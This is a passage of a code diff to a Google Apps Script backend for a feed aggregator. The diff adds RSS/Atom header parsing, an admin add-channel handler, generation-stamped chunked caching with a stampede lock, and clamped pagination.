+    var abs = resolveRelativeUrl(href.replace(/&amp;/g, '&'), baseUrl);
+    if (!abs || !isSafeUrl(abs)) continue;
+    var size = parseInt((t.match(/sizes=["'](\d+)x\d+/i) || [])[1] || '0', 10);
+    if (size > bestSize) { bestSize = size; best = abs; }
+  }
+  return best;
+}
+
+/**
+ * The feed's own channel-level image: RSS 2.0 <image><url>, or Atom
+ * <logo>/<icon>. Only the header (everything before the first item/entry) is
+ * searched, so an article's inline media can't masquerade as the site logo.
+ */
+function extractFeedImage(xml) {
+  if (!xml) return '';
+  var head = String(xml).split(/<item[\s>]|<entry[\s>]/i)[0];
+  var m = head.match(/<image>[\s\S]*?<url>\s*([^<]+?)\s*<\/url>[\s\S]*?<\/image>/i) ||
+          head.match(/<logo>\s*([^<]+?)\s*<\/logo>/i) ||
+          head.match(/<icon>\s*([^<]+?)\s*<\/icon>/i);
+  if (!m) return '';
+  var u = m[1].trim().replace(/&amp;/g, '&').replace(/^http:\/\//i, 'https://');
+  return isSafeUrl(u) ? u : '';
+}
+
+/**
+ * The site homepage a feed belongs to: RSS 2.0's channel-level text <link>, or
+ * Atom's rel="alternate" link. Header-only, same as extractFeedImage — an
+ * item's <link> is an article, not the site.
+ */
+function extractFeedSiteLink(xml) {
+  if (!xml) return '';
+  var head = String(xml).split(/<item[\s>]|<entry[\s>]/i)[0];
+  var m = head.match(/<link>\s*(https?:\/\/[^<\s]+?)\s*<\/link>/i) ||
+          head.match(/<link\b[^>]*rel=["']alternate["'][^>]*href=["']([^"']+)["']/i) ||
+          head.match(/<link\b[^>]*href=["']([^"']+)["'][^>]*rel=["']alternate["']/i);
+  if (!m) return '';
+  var u = normalizeChannelUrl(m[1].replace(/&amp;/g, '&'));
+  return isSafeUrl(u) ? u : '';
 }
 
 /**
@@ -1667,14 +2482,18 @@ function looksLikeFeed(url) {
       headers: { 'User-Agent': CHANNEL_FETCH_UA }
     });
     if (resp.getResponseCode() !== 200) return false;
-    var body = String(resp.getContentText()).slice(0, 1000).toLowerCase();
-    if (body.indexOf('<rss') !== -1 || body.indexOf('<feed') !== -1) return true;
-    if (body.indexOf('<?xml') !== -1 &&
-        (body.indexOf('<channel') !== -1 || body.indexOf('atom') !== -1)) return true;
-    return false;
+    return bodyLooksLikeFeed(resp.getContentText());
   } catch (e) {
     return false;
   }
+}
+
+/** True when the first bytes of a body read as RSS/Atom XML rather than HTML. */
+function bodyLooksLikeFeed(text) {
+  var body = String(text).slice(0, 1000).toLowerCase();
+  if (body.indexOf('<rss') !== -1 || body.indexOf('<feed') !== -1) return true;
+  return body.indexOf('<?xml') !== -1 &&
+    (body.indexOf('<channel') !== -1 || body.indexOf('atom') !== -1);
 }
 
 /**
@@ -1745,6 +2564,20 @@ function cleanChannelTitle(name) {
   if (!name) return '';
   var s = String(name).replace(/\s+/g, ' ').trim();
   return s.replace(/\s*[-|–—]\s*YouTube\s*$/i, '').trim();
+}
+
+/**
+ * Reads the channel-/feed-level <title> from RSS2 or Atom XML, tolerating
+ * CDATA. Item titles can't match first: RSS2 nests items inside <channel> after
+ * its own <title>, and an Atom feed's first <title> is the feed's. Names a
+ * source pasted as a bare feed URL, where there's no HTML page to scrape.
+ */
+function extractFeedTitle(xml) {
+  if (!xml) return '';
+  var m = String(xml).match(/<(?:channel|feed)[\s>][\s\S]*?<title[^>]*>([\s\S]*?)<\/title>/i);
+  if (!m) return '';
+  var t = m[1].replace(/^\s*<!\[CDATA\[([\s\S]*?)\]\]>\s*$/, '$1');
+  return decodeHtmlEntities(t).replace(/\s+/g, ' ').trim();
 }
 
 /**
@@ -2056,6 +2889,104 @@ function parseRegex(xml, channelName, tier, category) {
   return videos;
 }
 
+/**
+ * POST endpoint behind the add-channel.html admin form. The caller was already
+ * authenticated by the router (isAdmin, constant-time — the form's password is
+ * the admin token, sent in the POST body so it never lands in a URL).
+ *
+ * Resolves the submitted URL through the same SSRF-guarded resolver the sheet
+ * flow uses, refuses duplicates (by channel id, feed URL, or site URL), appends
+ * one fully-enriched, enabled row, and crawls that one feed inline so the new
+ * channel's content is there immediately instead of at the next 4h cycle.
+ *
+ * @param {{url:string}} data
+ * @returns {Object} { status:'ok', new_items:number, channel:{channel_name,
+ *   platform, feed_url, avatar} } on success, else { status:'error', message }
+ */
+function handleAddChannel(data) {
+  var rawUrl = String(data.url || '').trim();
+  if (!rawUrl) return { status: 'error', message: 'Missing channel URL' };
+  if (rawUrl.length > 500) return { status: 'error', message: 'URL too long' };
+
+  var info = resolveChannelFromUrl(rawUrl);
+  if (!info.ok) return { status: 'error', message: info.error };
+  if (!info.feed_url) {
+    return { status: 'error', message: 'No RSS/Atom feed found at ' + rawUrl };
+  }
+
+  var sheet = getSheet('CHANNELS');
+  var rows = sheet.getDataRange().getValues();
+  var headers = rows[0].slice();
+  var urlCol     = ensureChannelColumn(sheet, headers, 'url');
+  var nameCol    = ensureChannelColumn(sheet, headers, 'channel_name');
+  var idCol      = ensureChannelColumn(sheet, headers, 'channel_id');
+  var feedCol    = ensureChannelColumn(sheet, headers, 'feed_url');
+  var avatarCol  = ensureChannelColumn(sheet, headers, 'avatar');
+  var enabledCol = ensureChannelColumn(sheet, headers, 'enabled');
+
+  // Duplicate check — the sheet flow tolerates re-runs because it only fills
+  // blanks, but a form submit APPENDS, so it must refuse instead. Compare the
+  // stable identifiers, normalized the way the sheet stores them.
+  var normUrl = normalizeChannelUrl(rawUrl).replace(/\/+$/, '').toLowerCase();
+  for (var i = 1; i < rows.length; i++) {
+    var row = rows[i];
+    var dup =
+      (info.channel_id && String(row[idCol] || '').trim() === info.channel_id) ||
+      (String(row[feedCol] || '').trim() === info.feed_url) ||
+      (normUrl && normalizeChannelUrl(row[urlCol]).replace(/\/+$/, '').toLowerCase() === normUrl);
+    if (dup) {
+      var existing = String(row[nameCol] || row[urlCol] || ('row ' + (i + 1)));
+      return { status: 'error', message: 'Already in the list as "' + existing + '"' };
+    }
+  }
+
+  var newRow = [];
+  for (var c = 0; c < headers.length; c++) newRow.push('');
+  newRow[urlCol]     = normalizeChannelUrl(rawUrl);
+  newRow[nameCol]    = info.channel_name || '';
+  newRow[idCol]      = info.channel_id || '';
+  newRow[feedCol]    = info.feed_url;
+  newRow[avatarCol]  = info.avatar || '';
+  newRow[enabledCol] = true;
+  sheet.appendRow(newRow);
+
+  log('INFO', 'handleAddChannel', 'Added ' + (info.channel_name || normUrl) +
+    ' (' + (info.media_type === 'video' ? 'youtube' : 'article') + ')');
+
+  // Crawl JUST this feed, inline, so the channel has content the moment it is
+  // added. This used to call scheduleRefresh(), but that path has never worked
+  // on this deployment: installing a trigger needs the script.scriptapp scope,
+  // which the ANONYMOUS web app deliberately does not carry (see
+  // scheduleRefresh), so every add silently fell through to the 4h trigger.
+  // One feed fetch is bounded work, well inside the request budget, and
+  // fetchAllFeeds' own in-progress marker keeps this off a running full crawl.
+  // Best-effort: the row is saved either way, and the 4h cycle still covers a
+  // failure or a skip.
+  var newItems = 0;
+  try {
+    // The row was appended through the Sheets API above; flush so the crawl's
+    // own read of CHANNELS sees it rather than a pre-append snapshot.
+    SpreadsheetApp.flush();
+    var crawl = fetchAllFeeds(info.feed_url);
+    newItems = (crawl && crawl.new_videos) || 0;
+    log('INFO', 'handleAddChannel', 'Initial crawl of ' + info.feed_url + ': ' +
+      (crawl && crawl.skipped ? 'skipped (a crawl is already running)' : newItems + ' new item(s)'));
+  } catch (e) {
+    log('ERROR', 'handleAddChannel', 'Initial crawl failed for ' + info.feed_url + ': ' + e.message);
+  }
+
+  return {
+    status: 'ok',
+    new_items: newItems,
+    channel: {
+      channel_name: info.channel_name || '',
+      platform: info.media_type === 'video' ? 'youtube' : 'article',
+      feed_url: info.feed_url,
+      avatar: info.avatar || ''
+    }
+  };
+}
+
 // ============================================================
 // VIDEOS
 // ============================================================
@@ -2071,6 +3002,30 @@ function readAllVideos() {
 }
 
 /**
+ * The whole live catalog, sorted newest-first, from the chunked CacheService
+ * snapshot — or from one sheet scan that then populates it for every caller
+ * in the next CATALOG_CACHE_SECONDS. This is what the read-only handlers
+ * (feed pages past the head, cursor pages, search chunks, Top This Week's
+ * window, deep-link lookups) read instead of readAllVideos(), so a burst of
+ * requests costs one scan rather than one scan each.
+ *
+ * Returns the cached payload shape: { videos, total, gen, [fresh] }. `fresh`
+ * is set only on the call that produced the snapshot (never persisted), so a
+ * caller can refresh derived caches — the feed head — exactly once per scan.
+ * Expired provisional rows (a premiere/live item whose expires_at lapsed)
+ * make the snapshot a miss, like the head: the scan drops them.
+ *
+ * @returns {{videos: Object[], total: number, gen: number, fresh?: boolean}}
+ */
+function readSortedCatalog() {
+  return cachedSortedList(CATALOG_CACHE_KEY, CATALOG_CACHE_SECONDS, function() {
+    var videos = readAllVideos();
+    videos.sort(compareVideos);
+    return videos;
+  }, { total: true, checkExpiry: true });
+}
+
+/**
  * Turns a raw sheet grid (header + rows) into normalized, deduped video
  * objects. Shared by readAllVideos (live sheet) and readArchiveVideos (the
  * Archive tab) so both serve the exact same shape — same expiry drop, same
@@ -2083,6 +3038,14 @@ function normalizeVideoRows(data) {
   if (!data || data.length <= 1) return [];
 
   var headers = data[0];
+  // Resolve the id column once. A sheet may head its id column 'video_id' OR
+  // 'item_id' (findVideoIdCol accepts both, and the crawl prefers item_id), but
+  // everything downstream — dedupeByUrl, compareVideos, cursorFor, handleVideo —
+  // reads video.video_id directly. On an item_id-headed sheet that would be
+  // undefined: dedupe collapses url-less rows under 'id:undefined', cursors
+  // become "…|undefined", and ?v=<id> deep links resolve to nothing. Normalize
+  // the id into video.video_id here so the rest of the pipeline is unaffected.
+  var idCol = findVideoIdCol(headers);
   var videos = [];
   var nowMs = Date.now();
 
@@ -2092,6 +3055,7 @@ function normalizeVideoRows(data) {
     for (var j = 0; j < headers.length; j++) {
       video[headers[j]] = row[j];
     }
+    if (idCol !== -1) video.video_id = row[idCol];
 
     // Drop provisional premiere/live entries whose expiry has passed. A
     // scheduled premiere or running stream is surfaced while fresh; when it
@@ -2136,47 +3100,278 @@ function readArchiveVideos() {
   return normalizeVideoRows(sheet.getDataRange().getValues());
 }
 
+/** The generation an invalidate has advanced to; 0 before any writer has run. */
+function currentCacheGeneration() {
+  try {
+    var raw = PropertiesService.getScriptProperties().getProperty(CACHE_GENERATION_PROP);
+    var n = parseInt(raw, 10);
+    return isNaN(n) ? 0 : n;
+  } catch (e) {
+    return 0;
+  }
+}
+
+/**
+ * Advances the generation so every cached sorted-list payload stamped with an
+ * earlier value is now stale. Called by every invalidate*. Best-effort: if the
+ * property store hiccups the caches simply keep their key-level remove() as the
+ * fallback. The read-modify-write isn't locked — two concurrent bumps that both
+ * see N and write N+1 only under-count by one, and the invariant we need (the
+ * generation is strictly greater than any value captured before the bump) still
+ * holds, so no snapshot read before the bump can match again.
+ */
+function bumpCacheGeneration() {
+  try {
+    var props = PropertiesService.getScriptProperties();
+    var next = currentCacheGeneration() + 1;
+    props.setProperty(CACHE_GENERATION_PROP, String(next));
+    return next;
+  } catch (e) {
+    return 0;
+  }
+}
+
+/**
+ * The one gen-validated read behind readFeedHead, readTopWeek, and
+ * cachedSortedList. Returns the cached payload ({ videos, [total], gen }) only
+ * when it is well-formed AND its stamp still matches the live generation; any
+ * miss, parse error, shape mismatch, stale stamp, or (when checkExpiry) a
+ * lapsed provisional entry yields null so the caller re-derives from the sheet.
+ *
+ * @param {string} key
+ * @param {{requireTotal?:boolean, checkExpiry?:boolean}} [options]
+ * @returns {Object|null}
+ */
+function readCachedSortedList(key, options) {
+  options = options || {};
+  try {
+    var raw = cacheGetChunked(CacheService.getScriptCache(), key);
+    if (!raw) return null;
+    var payload = JSON.parse(raw);
+    if (!payload || !Array.isArray(payload.videos)) return null;
+    // Stale-snapshot guard: a payload stamped under an earlier generation was
+    // read before a writer's invalidate bumped the counter — treat it as a miss
+    // rather than serve pre-write data for the rest of the TTL.
+    if (typeof payload.gen !== 'number' || payload.gen !== currentCacheGeneration()) return null;
+    if (options.requireTotal && typeof payload.total !== 'number') return null;
+    if (options.checkExpiry) {
+      var nowMs = Date.now();
+      for (var i = 0; i < payload.videos.length; i++) {
+        var exp = payload.videos[i].expires_at;
+        if (exp) {
+          var expMs = new Date(exp).getTime();
+          if (!isNaN(expMs) && expMs < nowMs) return null;
+        }
+      }
+    }
+    return payload;
+  } catch (e) {
+    return null;
+  }
+}
+
+/**
+ * The one gen-guarded populate behind every cached sorted list. `capturedGen`
+ * is the generation read BEFORE the source sheet was scanned; if the generation
+ * has advanced since (a concurrent writer invalidated mid-scan) the payload is
+ * already stale, so it is refused rather than installed for the full TTL — this
+ * is the write half that closes the repopulation race. Best-effort otherwise:
+ * an oversized value or cache hiccup just means the next request re-scans.
+ *
+ * @returns {boolean} true iff the payload was stamped and stored.
+ */
+function putCachedSortedList(key, ttlSeconds, payload, capturedGen) {
+  try {
+    if (capturedGen !== currentCacheGeneration()) return false;
+    payload.gen = capturedGen;
+    cachePutChunked(CacheService.getScriptCache(), key, JSON.stringify(payload), ttlSeconds, capturedGen);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+/**
+ * Stores a JSON string in CacheService, splitting values past the 100KB/key cap
+ * into chunks. Small values go under `key` as-is (so nothing changes for the
+ * feed head and Top This Week). A big value is first escaped to pure ASCII so
+ * one char is one byte (CacheService counts bytes; a Hebrew or emoji title is
+ * 2-4 bytes per char), cut into CACHE_CHUNK_CHARS pieces stored under
+ * `key.<tag>.<i>`, and then — last, so a reader never sees a manifest before
+ * its chunks exist — a manifest `{__chunks, tag, len}` goes under `key`. The
+ * tag (the generation the payload was stamped with) is part of the chunk keys,
+ * so a reader can never stitch chunks from two different snapshots together.
+ * Chunks from a superseded snapshot just age out with their TTL. Throws on
+ * failure like a plain put; callers already treat that as "not cached".
+ */
+function cachePutChunked(cache, key, json, ttlSeconds, tag) {
+  if (json.length <= CACHE_CHUNK_CHARS && !/[\u007f-\uffff]/.test(json)) {
+    cache.put(key, json, ttlSeconds);
+    return;
+  }
+  var ascii = json.replace(/[\u007f-\uffff]/g, function(c) {
+    return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
+  });
+  if (ascii.length <= CACHE_CHUNK_CHARS) {
+    cache.put(key, ascii, ttlSeconds);
+    return;
+  }
+  var n = Math.ceil(ascii.length / CACHE_CHUNK_CHARS);
+  var parts = {};
+  for (var i = 0; i < n; i++) {
+    parts[chunkKey_(key, tag, i)] = ascii.substr(i * CACHE_CHUNK_CHARS, CACHE_CHUNK_CHARS);
+  }
+  if (typeof cache.putAll === 'function') {
+    cache.putAll(parts, ttlSeconds);
+  } else {
+    for (var k in parts) cache.put(k, parts[k], ttlSeconds);
+  }
+  cache.put(key, JSON.stringify({ __chunks: n, tag: tag, len: ascii.length }), ttlSeconds);
+}
+
+/**
+ * Reads a value stored by cachePutChunked: a plain value comes back as-is; a
+ * manifest is expanded by fetching its chunks (one getAll) and checking every
+ * piece is present and the total length matches. Any gap — a chunk evicted
+ * early, a half-written snapshot — yields null, which every caller treats as
+ * a miss and re-derives from the sheet.
+ */
+function cacheGetChunked(cache, key) {
+  var raw = cache.get(key);
+  if (!raw) return null;
+  if (raw.indexOf('{"__chunks"') !== 0) return raw;
+  var manifest = JSON.parse(raw);
+  var n = manifest.__chunks;
+  if (typeof n !== 'number' || n < 1) return null;
+  var keys = [];
+  for (var i = 0; i < n; i++) keys.push(chunkKey_(key, manifest.tag, i));
+  var parts;
+  if (typeof cache.getAll === 'function') {
+    parts = cache.getAll(keys) || {};
+  } else {
+    parts = {};
+    for (var j = 0; j < keys.length; j++) parts[keys[j]] = cache.get(keys[j]);
+  }
+  var out = '';
+  for (var m = 0; m < keys.length; m++) {
+    var piece = parts[keys[m]];
+    if (typeof piece !== 'string' || !piece) return null;
+    out += piece;
+  }
+  if (typeof manifest.len === 'number' && out.length !== manifest.len) return null;
+  return out;
+}
+
+function chunkKey_(key, tag, i) {
+  return key + '.' + String(tag) + '.' + i;
+}
+
+/**
+ * Self-populating gen-validated cache over a sorted list: serve the stamped
+ * payload on a fresh hit, else capture the generation, run `producer` (which
+ * returns the full sorted list), stamp+store it, and return it. Folds the
+ * read/populate/invalidate triad into one path; the archive uses it directly,
+ * and the feed-head / top-week fast+full split shares its read and put cores.
+ *
+ * @param {string} key
+ * @param {number} ttlSeconds
+ * @param {function():Object[]} producer - returns the full sorted list
+ * @param {{total?:boolean, checkExpiry?:boolean, cap?:number}} [options]
+ *   total: also store/validate a `total` count; checkExpiry: drop on a lapsed
+ *   provisional entry; cap: store only the first N items (0/absent = store all).
+ * @returns {Object} the cached-or-freshly-produced payload
+ */
+function cachedSortedList(key, ttlSeconds, producer, options) {
+  options = options || {};
+  var cached = readCachedSortedList(key, {
+    requireTotal: !!options.total,
+    checkExpiry: !!options.checkExpiry,
+  });
+  if (cached) return cached;
+
+  // Stampede guard. A miss is shared by every request in flight at that
+  // moment — one visitor's landing is feed + Top Week + comments, a search
+  // focus is 4 parallel chunk pages — and before this each of them ran its own
+  // full sheet scan. Those concurrent scans are what tripped "Too many
+  // simultaneous invocations: Spreadsheets" (1,200+ failures, 2026-10-03..08)
+  // and, once the service was saturated, wedged executions at the 6-minute
+  // limit. So: take the script lock, re-check the cache (the holder before us
+  // most likely populated it), and scan only if it is still a miss. Waiting on
+  // the lock touches no sheet, so waiters cost the Spreadsheet service nothing.
+  //
+  // Bounded and best-effort: if the lock can't be had within
+  // SORTED_LIST_REBUILD_LOCK_MS the request falls through to its own scan, which
+  // is exactly the pre-guard behaviour — never worse, just unshared. The lock is
+  // the same script lock the writers use, and LockService is not reentrant, so
+  // this must only ever run on the read-only paths (getVideos, handleTopWeek,
+  // handleVideo, handleArchive), none of which hold it. A writer that lands
+  // while a scan holds the lock waits a normal scan's few seconds at most.
+  var lock = null;
+  try {
+    lock = LockService.getScriptLock();
+    lock.waitLock(SORTED_LIST_REBUILD_LOCK_MS);
+  } catch (e) {
+    lock = null; // contended past the bound (or no LockService): scan unshared
+  }
+  try {
+    if (lock) {
+      cached = readCachedSortedList(key, {
+        requireTotal: !!options.total,
+        checkExpiry: !!options.checkExpiry,
+      });
+      if (cached) return cached;
+    }
+
+    // Capture the generation BEFORE reading the sheet: an invalidate that lands
+    // during the scan advances it past this value, and putCachedSortedList then
+    // refuses the now-stale snapshot.
+    var gen = currentCacheGeneration();
+    var videos = producer();
+    var cap = options.cap || 0;
+    var payload = { videos: cap > 0 ? videos.slice(0, cap) : videos, gen: gen };
+    if (options.total) payload.total = videos.length;
+    putCachedSortedList(key, ttlSeconds, payload, gen);
+    payload.fresh = true; // this call paid the scan (never persisted — set after the put)
+    return payload;
+  } finally {
+    if (lock) {
+      try { lock.releaseLock(); } catch (e) { /* already released or lost — nothing to hold */ }
+    }
+  }
+}
+
 /**
  * The full archive, sorted newest-first, read through a short-lived cache.
  *
  * The archive request is cold (only a full-history search/favorites build hits
  * it) but the frontend pulls it in several offset pages back-to-back; caching
  * the sorted list means the whole burst costs ONE sheet scan+sort instead of
- * one per page. Best-effort: an archive too large for the 100KB cache value
- * silently falls through to a live scan per request (the try/catch), and the
- * cache is dropped whenever a crawl adds to the archive (invalidateArchive).
+ * one per page. Best-effort via cachedSortedList: an archive too large for the
+ * 100KB cache value silently falls through to a live scan per request, and any
+ * writer's invalidate (generation bump) drops it. No `total` and no expiry scan,
+ * matching the historic archive contract — it serves the plain `{videos}` list.
  *
  * @returns {Object[]} archived videos, sorted by compareVideos
  */
 function readSortedArchive() {
-  try {
-    var raw = CacheService.getScriptCache().get(ARCHIVE_CACHE_KEY);
-    if (raw) {
-      var cached = JSON.parse(raw);
-      if (cached && Array.isArray(cached.videos)) return cached.videos;
-    }
-  } catch (e) {
-    /* fall through to a live scan */
-  }
-
-  var videos = readArchiveVideos();
-  videos.sort(compareVideos);
-
-  try {
-    CacheService.getScriptCache().put(
-      ARCHIVE_CACHE_KEY, JSON.stringify({ videos: videos }), ARCHIVE_CACHE_SECONDS);
-  } catch (e) {
-    /* oversized archive or cache hiccup — next request re-scans */
-  }
-  return videos;
+  return cachedSortedList(ARCHIVE_CACHE_KEY, ARCHIVE_CACHE_SECONDS, function() {
+    var videos = readArchiveVideos();
+    videos.sort(compareVideos);
+    return videos;
+  }, { total: false, checkExpiry: false }).videos;
 }
 
-/** Drops the cached sorted archive. Called when a crawl adds rows to it. */
+/**
+ * Invalidates the cached sorted archive. Bumps the generation (which alone
+ * defeats a late populate stamped with the pre-bump value) and drops the key.
+ * Called when a crawl archives rows or an archived count changes.
+ */
 function invalidateArchive() {
+  bumpCacheGeneration();
   try {
     CacheService.getScriptCache().remove(ARCHIVE_CACHE_KEY);
   } catch (e) {
-    /* best-effort */
+    /* best-effort — the generation bump already invalidated it */
   }
 }
 
@@ -2186,17 +3381,48 @@ function invalidateArchive() {
  * search-index build already consumes from the feed, so the same chunked
  * fetch-and-merge loop drives it. Read-only.
  *
+ * Each page is cached under its OWN key (page + clamped limit). A page holds at
+ * most `limit` (<= MAX_PAGE_LIMIT) items, so its cache value always fits — unlike
+ * the single whole-archive value in readSortedArchive, which silently stops
+ * caching once the ever-growing archive outgrows the cache-value limit and then
+ * re-scans+sorts per page. Once a page is warm, serving it costs no sheet read
+ * at all, and the value size is bounded by `limit` however large the tab grows.
+ *
+ * The page cache is generation-stamped through the same readCachedSortedList /
+ * putCachedSortedList cores cachedSortedList uses (the low-level cores rather
+ * than cachedSortedList itself, so the whole-archive `total` — not the page
+ * length — rides along on the payload). invalidateArchive's generation bump
+ * therefore drops every cached page at once, no per-page key enumeration needed.
+ * A cold page still shares ONE scan+sort across a multi-page burst: the miss
+ * path derives from readSortedArchive, whose full-list snapshot is itself cached
+ * for the burst.
+ *
  * @param {Object} params - { page, limit }
  * @returns {Object} { status:'ok', videos, total, page }
  */
 function handleArchive(params) {
-  var page = parseInt(params.page) || 1;
-  var limit = parseInt(params.limit) || DEFAULT_PAGE_LIMIT;
+  // Clamp page and cap limit so a negative page or a giant limit can't drive a
+  // negative-index slice or a whole-archive serialization (BE11).
+  var page = Math.max(1, parseInt(params.page) || 1);
+  var limit = Math.min(Math.max(1, parseInt(params.limit) || DEFAULT_PAGE_LIMIT), MAX_PAGE_LIMIT);
 
+  var pageKey = ARCHIVE_CACHE_KEY + '_p' + page + '_l' + limit;
+
+  // Fresh hit: serve this page (and its archive-wide total) without any read.
+  var cached = readCachedSortedList(pageKey, { requireTotal: true });
+  if (cached) {
+    return { status: 'ok', videos: cached.videos, total: cached.total, page: page };
+  }
+
+  // Miss: capture the generation BEFORE the read so a concurrent invalidate that
+  // lands during it refuses the now-stale page below, then derive from the
+  // shared sorted list (cached, so a multi-page burst pays one scan+sort).
+  var gen = currentCacheGeneration();
   var videos = readSortedArchive();
   var start = (page - 1) * limit;
   var paged = start >= 0 ? videos.slice(start, start + limit) : [];
 
+  putCachedSortedList(pageKey, ARCHIVE_CACHE_SECONDS, { videos: paged, total: videos.length }, gen);
   return { status: 'ok', videos: paged, total: videos.length, page: page };
 }
 
@@ -2220,6 +3446,27 @@ function handleVideo(params) {
     return { status: 'error', message: 'Missing videoId' };
   }
 
+  // Not-found short-circuit (BE11): a recent lookup that resolved to nothing is
+  // remembered briefly, so a burst of the same bogus id can't repeatedly force
+  // the readSortedCatalog() + readSortedArchive() reads below (each a sheet
+  // scan when its cache is cold). Best-effort, and
+  // only for ids short enough to be a safe cache key. Keyed by id — a video that
+  // later appears is a cache miss until this marker's short TTL lapses, which is
+  // acceptable for a deep-link lookup.
+  var cache = null;
+  var missKey = null;
+  try {
+    cache = CacheService.getScriptCache();
+    if (videoId.length <= 128) {
+      missKey = 'vidmiss_' + videoId;
+      if (cache.get(missKey)) {
+        return { status: 'ok', video: null };
+      }
+    }
+  } catch (e) {
+    cache = null;
+  }
+
   function findIn(videos) {
     for (var i = 0; i < videos.length; i++) {
       if (videos[i].video_id === videoId) return videos[i];
@@ -2229,8 +3476,17 @@ function handleVideo(params) {
 
   var head = readFeedHead();
   var video = head ? findIn(head.videos) : null;
-  if (!video) video = findIn(readAllVideos());
+  if (!video) video = findIn(readSortedCatalog().videos);
   if (!video) video = findIn(readSortedArchive());
+
+  // Cache the miss so the next lookup of this id skips both full scans.
+  if (!video && cache && missKey) {
+    try {
+      cache.put(missKey, '1', VIDEO_MISS_CACHE_SECONDS);
+    } catch (e) {
+      // best-effort — a failed put just means the next lookup rescans
+    }
+  }
 
   return { status: 'ok', video: video };
 }
@@ -2301,7 +3557,7 @@ function getVideos(page, limit, cursor) {
   // offset: a negative page/limit yields slice(-40, -20) nonsense (a window from
   // the END of the list) instead of an empty/first page.
   page = Math.max(1, page);
-  limit = Math.max(1, limit);
+  limit = Math.min(Math.max(1, limit), MAX_PAGE_LIMIT); // cap oversized page sizes (BE11)
   var start = (page - 1) * limit;
 
   // Fast path: serve early no-cursor pages from the cached feed head, skipping
@@ -2325,25 +3581,26 @@ function getVideos(page, limit, cursor) {
     }
   }
 
-  var videos = readAllVideos();
+  // Everything the head can't answer comes from the whole-catalog snapshot:
+  // one sheet scan + sort per CATALOG_CACHE_SECONDS (or per invalidation),
+  // shared by every cursor page, deep offset page and search chunk in flight.
+  // The snapshot carries the generation captured before its scan, so the head
+  // populate below stays guarded against a concurrent invalidate (BE2 race).
+  var catalog = readSortedCatalog();
+  var videos = catalog.videos;
 
   if (videos.length === 0) {
     return { status: 'ok', videos: [], total: 0, page: page, next_cursor: '' };
   }
 
-  // Sort by published_at descending (newest first), video_id tiebreak
-  videos.sort(compareVideos);
-
-  // Read-through populate: any full-path request refreshes the head for the
-  // next caller. Best-effort — an oversized value or cache hiccup just means
-  // the next request scans the sheet again.
-  try {
-    CacheService.getScriptCache().put(FEED_HEAD_CACHE_KEY, JSON.stringify({
+  // Read-through populate of the head: once per scan (the call that produced
+  // the snapshot), or when this request fell through a missing head. A warm
+  // cursor page must NOT rewrite the head on every call. Best-effort.
+  if (catalog.fresh || (!cursor && start + limit <= FEED_HEAD_COUNT)) {
+    putCachedSortedList(FEED_HEAD_CACHE_KEY, FEED_HEAD_CACHE_SECONDS, {
       videos: videos.slice(0, FEED_HEAD_COUNT),
       total: videos.length,
-    }), FEED_HEAD_CACHE_SECONDS);
-  } catch (e) {
-    /* cache write is optional */
+    }, catalog.gen);
   }
 
   // Cursor pagination: resume strictly after the (published_at, video_id)
@@ -2379,96 +3636,90 @@ function getVideos(page, limit, cursor) {
 }
 
 /**
- * Reads the cached feed head, or null on any miss/problem. A head containing
- * a provisional premiere/live entry whose expiry has passed is treated as a
- * miss rather than re-filtered — dropping rows here would shift the slice
- * offsets and total; the live path re-derives everything consistently.
+ * Reads the cached feed head, or null on any miss/problem. Delegates to the
+ * shared gen-validated reader: a stale-stamped head (read before a writer's
+ * invalidate) is a miss, and a head containing a provisional premiere/live
+ * entry whose expiry has passed is treated as a miss rather than re-filtered —
+ * dropping rows here would shift the slice offsets and total; the live path
+ * re-derives everything consistently.
  */
 function readFeedHead() {
-  try {
-    var raw = CacheService.getScriptCache().get(FEED_HEAD_CACHE_KEY);
-    if (!raw) return null;
-    var head = JSON.parse(raw);
-    if (!head || !Array.isArray(head.videos) || typeof head.total !== 'number') return null;
-    var nowMs = Date.now();
-    for (var i = 0; i < head.videos.length; i++) {
-      var exp = head.videos[i].expires_at;
-      if (exp) {
-        var expMs = new Date(exp).getTime();
-        if (!isNaN(expMs) && expMs < nowMs) return null;
-      }
-    }
-    return head;
-  } catch (e) {
-    return null;
-  }
+  return readCachedSortedList(FEED_HEAD_CACHE_KEY, { requireTotal: true, checkExpiry: true });
 }
 
 /**
- * Drops the cached feed head. Call from ANY writer that changes what the head
- * would contain — crawl completions (new rows, refreshed view counts / live
- * state) and vote/comment recounts (counts are baked into the cached rows).
- * Cheap enough to call unconditionally; the next feed request repopulates.
+ * Invalidates the cached feed head. Call from ANY writer that changes what the
+ * head would contain — crawl completions (new rows, refreshed view counts /
+ * live state) and vote/comment recounts (counts are baked into the cached
+ * rows). Bumps the generation (which alone defeats a late populate stamped with
+ * the pre-bump value) and drops the key. Cheap enough to call unconditionally.
  */
 function invalidateFeedHead() {
+  bumpCacheGeneration();
   try {
-    CacheService.getScriptCache().remove(FEED_HEAD_CACHE_KEY);
+    var cache = CacheService.getScriptCache();
+    cache.remove(FEED_HEAD_CACHE_KEY);
+    cache.remove(CATALOG_CACHE_KEY); // chunks age out; the manifest is what readers key on
   } catch (e) {
-    /* best-effort */
+    /* best-effort — the generation bump already invalidated it */
   }
 }
 
 /**
  * Reads the cached Top-This-Week payload, or null on any miss/problem. Mirrors
- * readFeedHead: a cached entry holding a provisional premiere/live item whose
- * expiry has passed is treated as a miss rather than served — the live path
- * re-derives the ranked window cleanly from readAllVideos (which drops expired
- * rows), so dropping one here would just desync the count.
+ * readFeedHead via the shared gen-validated reader: a stale-stamped payload is a
+ * miss, and one holding a provisional premiere/live item whose expiry has passed
+ * is treated as a miss rather than served — the live path re-derives the ranked
+ * window cleanly from readAllVideos (which drops expired rows).
  */
 function readTopWeek() {
-  try {
-    var raw = CacheService.getScriptCache().get(TOP_WEEK_CACHE_KEY);
-    if (!raw) return null;
-    var payload = JSON.parse(raw);
-    if (!payload || !Array.isArray(payload.videos) || typeof payload.total !== 'number') return null;
-    var nowMs = Date.now();
-    for (var i = 0; i < payload.videos.length; i++) {
-      var exp = payload.videos[i].expires_at;
-      if (exp) {
-        var expMs = new Date(exp).getTime();
-        if (!isNaN(expMs) && expMs < nowMs) return null;
-      }
-    }
-    return payload;
-  } catch (e) {
-    return null;
-  }
+  return readCachedSortedList(TOP_WEEK_CACHE_KEY, { requireTotal: true, checkExpiry: true });
 }
 
 /**
- * Drops the cached Top-This-Week payload. Called from the same writers that
